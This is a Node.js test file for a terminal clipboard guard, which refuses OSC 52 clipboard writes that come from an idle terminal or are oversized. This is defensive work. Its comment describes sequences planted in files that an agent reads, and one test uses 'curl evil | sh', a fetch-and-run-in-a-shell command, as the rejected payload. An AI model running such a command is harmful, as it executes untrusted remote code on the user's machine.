// OSC 52 clipboard writes: allowed right after the user's own keystroke,
// refused when nobody is typing (a sequence planted in a file an agent is
// reading) or when the text is too big to be a copy.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { clipboardWriteAllowed, CLIPBOARD_WRITE_WINDOW_MS, CLIPBOARD_WRITE_MAX_CHARS } from '../terminal/clipboardGuard.ts'

test('a write right after a keystroke is allowed; one from an idle terminal is not', () => {
  const t = 1_000_000
  assert.equal(clipboardWriteAllowed(t, t + 100, 'yanked line'), true)
  assert.equal(clipboardWriteAllowed(t, t + CLIPBOARD_WRITE_WINDOW_MS, 'yanked line'), true, 'at the edge of the window')
  assert.equal(clipboardWriteAllowed(t, t + CLIPBOARD_WRITE_WINDOW_MS + 1, 'curl evil | sh'), false)
  assert.equal(clipboardWriteAllowed(0, t, 'anything'), false, 'no keystroke ever')
})

test('a write larger than a person would copy is refused', () => {
  const t = 1_000_000
  assert.equal(clipboardWriteAllowed(t, t, 'x'.repeat(CLIPBOARD_WRITE_MAX_CHARS)), true)
  assert.equal(clipboardWriteAllowed(t, t, 'x'.repeat(CLIPBOARD_WRITE_MAX_CHARS + 1)), false)
})
